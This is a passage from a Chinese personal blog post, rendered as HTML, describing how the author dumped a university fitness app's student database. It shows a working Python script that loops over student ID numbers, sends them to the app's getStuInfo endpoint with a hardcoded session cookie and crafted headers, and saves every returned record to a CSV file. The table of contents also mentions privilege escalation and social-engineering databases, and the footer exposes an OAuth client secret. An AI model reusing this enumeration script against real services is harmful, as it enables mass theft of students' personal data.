&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> headerString.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        key = ea.split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        data = ea.split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>].rstrip()</span><br><span class="line">        headerDict[key] = data</span><br><span class="line">    <span class="keyword">return</span> headerDict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取学号</span></span><br><span class="line">userNums = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./学号.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f_csv = csv.reader(f)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> f_csv:</span><br><span class="line">        userNums.append(int(row[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;0270007DC6DA2635CEF27281E029C640&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;https://xd.boxkj.com/app/getStuInfo&#x27;</span></span><br><span class="line">postpayload = &#123;<span class="string">&quot;userNum&quot;</span>: <span class="string">&quot;19169100001&quot;</span>&#125;</span><br><span class="line">r = requests.post(url, data=postpayload, headers=getheaderDict(<span class="number">19169100001</span>,headerString1,headerString2), cookies=cookie)</span><br><span class="line"><span class="comment"># # print(r.headers)</span></span><br><span class="line"><span class="comment"># print(r.text[:])  # 输出响应主体</span></span><br><span class="line">j = json.loads(r.text[:])[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">k = j.keys()</span><br><span class="line">csvHeaders = list(k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./StudentData.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f_csv = csv.DictWriter(f, csvHeaders)</span><br><span class="line">    f_csv.writeheader()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(userNums[:]):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            postpayload = &#123;<span class="string">&quot;userNum&quot;</span>: str(i)&#125;</span><br><span class="line">            r = requests.post(url, data=postpayload,</span><br><span class="line">                            headers=getheaderDict(i,headerString1,headerString2), cookies=cookie)</span><br><span class="line">            j = json.loads(r.text[:])[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">            k = j.keys()</span><br><span class="line">            csvHeaders = list(k)</span><br><span class="line">            f_csv.writerow(j)</span><br><span class="line">            <span class="comment"># print(i,&quot;: OK!&quot;)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># print(i,&quot;: no number!&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./Ok.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;shutdown -s&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408004409062.png" alt="image-20210408004409062"></p>
+<p>主要速度限制与服务器的相应速度。有待进行多线程的优化……</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>感觉学校的有些网站还是很不安全的，信息泄露的风险也很大</p>
+<p>发现了漏洞也不知道有没有反馈方法让学校知道</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Framist
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/" title="XD体适能：从小洞到“脱库”">http://example.com/2021/04/08/XD体适能脱库/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/JS%E5%8F%8D%E7%88%AC%E8%99%AB/" rel="tag"># JS反爬虫</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/07/XDSEC%E4%B8%AA%E4%BA%BA%E5%91%A8%E6%8A%A50x08/" rel="prev" title="XDSEC个人周报0x08">
+      <i class="fa fa-chevron-left"></i> XDSEC个人周报0x08
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XD%E4%BD%93%E9%80%82%E8%83%BD%EF%BC%9A%E4%BB%8E%E5%B0%8F%E6%B4%9E%E5%88%B0%E2%80%9C%E8%84%B1%E5%BA%93%E2%80%9D"><span class="nav-number">1.</span> <span class="nav-text">XD体适能：从小洞到“脱库”</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%A6%81"><span class="nav-number">1.1.</span> <span class="nav-text">摘要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.2.</span> <span class="nav-text">步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.2.1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">1.2.2.</span> <span class="nav-text">信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8DJS%E5%8F%8D%E7%88%AC%E8%99%AB"><span class="nav-number">1.2.3.</span> <span class="nav-text">反JS反爬虫</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E6%88%AA%E5%A4%84%E7%90%86"><span class="nav-number">1.2.4.</span> <span class="nav-text">时间截处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.5.</span> <span class="nav-text">社工库使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%AC%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.6.</span> <span class="nav-text">爬取信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">1.3.</span> <span class="nav-text">后记</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Framist</p>
+  <div class="site-description" itemprop="description">框架主义者的小窝</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/framist" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;framist" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:framist@163.com" title="E-Mail → mailto:framist@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_47102975" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_47102975" rel="noopener" target="_blank"><i class="fas fa-angle-right fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yuexiavqiufeng.github.io/" title="https:&#x2F;&#x2F;yuexiavqiufeng.github.io&#x2F;" rel="noopener" target="_blank">yuexiavqiufeng</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.com/framist" title="https:&#x2F;&#x2F;github.com&#x2F;framist" rel="noopener" target="_blank">广告位招租</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-at"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Framist</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div><script>
+    let body = document.getElementsByTagName('body')[0];
+    body.addEventListener('click', (e) => {
+        let contentArr = ['欧拉~','ˋ( ° ▽、° ) ','RGB!','_(:з」∠)_','哼','?','¿框架?','QAQ','bing的随机图片API貌似崩了，背景白色先将就吧',':3'];
+        let randomNum = function (n) {
+            return Math.floor(Math.random() * n)
+        }
+        let span = document.createElement('span');
+        span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+        span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+        span.style.position = 'absolute';
+        span.style.top = `${e.pageY}px`;
+        span.style.left = `${e.pageX}px`;
+        span.style.transition = 'all 1s ease';
+        span.style.zIndex = 20000;
+        body.appendChild(span)
+        setTimeout(()=>{
+            span.style.top = span.offsetTop - 25 + 'px';
+            span.style.opacity = 0;
+            setTimeout(()=>{span.remove()},700)
+        },700)
+    })
+</script>
+
+
+
+
+<script type="text/javascript" color="255,255,255" pointColor='255,255,255' opacity='0.5' zIndex="-1" count="233" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '267a9d4a89b9b72b2229',
+      clientSecret: '2dba1f14d21da707ed6c4497fecc05d6178b4fa3',
+      repo        : 'blog-comment',
+      owner       : 'framist',
+      admin       : ['framist'],
+      id          : '49e8a4835f2555e3a6429220cbacff2e',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
